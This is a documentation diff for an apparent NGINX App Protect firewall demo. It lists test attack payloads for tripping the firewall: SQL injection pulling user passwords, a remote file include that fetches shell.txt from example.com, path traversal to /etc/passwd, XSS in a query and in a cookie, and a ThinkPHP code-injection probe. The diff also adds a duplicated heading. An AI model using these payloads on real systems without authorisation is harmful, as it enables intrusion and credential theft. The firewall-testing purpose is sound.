@@ -133,38 +133,40 @@ Protect WAF to protect your applications from attacks.
 
 == Optional Attack Payloads to Trigger App Protect
 
+== Optional Attack Payloads to Trigger App Protect
+
 Use these by appending them to the application URL (e.g., `http://$nginx_ingress/`):
 
-* *SQL Injection*  
-  `?hfsagrs=-1+UNION+SELECT+user,password+FROM+users--`
+*SQL Injection* +
+`?hfsagrs=-1+UNION+SELECT+user,password+FROM+users--`
 
-* *Remote File Include (RFI)*  
-  `?hfsagrs=php://filter/resource=http://example.com/shell.txt`
+*Remote File Include (RFI)* +
+`?hfsagrs=php://filter/resource=http://example.com/shell.txt`
 
-* *Command Execution*  
-  `?hfsagrs=/proc/self/environ`
+*Command Execution* +
+`?hfsagrs=/proc/self/environ`
 
-* *HTTP Parser Attack*  
-  `?XDEBUG_SESSION_START=phpstorm`
+*HTTP Parser Attack* +
+`?XDEBUG_SESSION_START=phpstorm`
 
-* *Path Traversal (Predictable Resource Location)*  
-  `/lua/login.lua?referer=google.com/&hfsagrs=../../../../../../../../etc/passwd`
+*Path Traversal (Predictable Resource Location)* +
+`/lua/login.lua?referer=google.com/&hfsagrs=../../../../../../../../etc/passwd`
 
-* *Cross-Site Scripting (XSS)*  
-  `/lua/login.lua?referer=google.com/&hfsagrs="onmouseover=alert('XSS')"`
+*Cross-Site Scripting (XSS)* +
+`/lua/login.lua?referer=google.com/&hfsagrs="onmouseover=alert('XSS')"`
 
-* *Information Leakage Probe*  
-  `/lua/login.lua?referer=google.com/&hfsagrs=efw`
+*Information Leakage Probe* +
+`/lua/login.lua?referer=google.com/&hfsagrs=efw`
 
-* *Forced Browsing (Parser Attack)*  
-  `/dana-na/auth/url_default/welcome.cgi`
+*Forced Browsing (Parser Attack)* +
+`/dana-na/auth/url_default/welcome.cgi`
 
-* *ThinkPHP Code Injection*  
-  `/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP`
+*ThinkPHP Code Injection* +
+`/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP`
 
-* *Header-based XSS (via Cookie)*  
-  Add this header:  
-  `Cookie: hfsagrs='"><script>alert("XSS")</script>`
+*Header-based XSS (via Cookie)* +
+`Cookie: hfsagrs='"><script>alert("XSS")</script>'`
+
 
 
 This bash script has a few more.
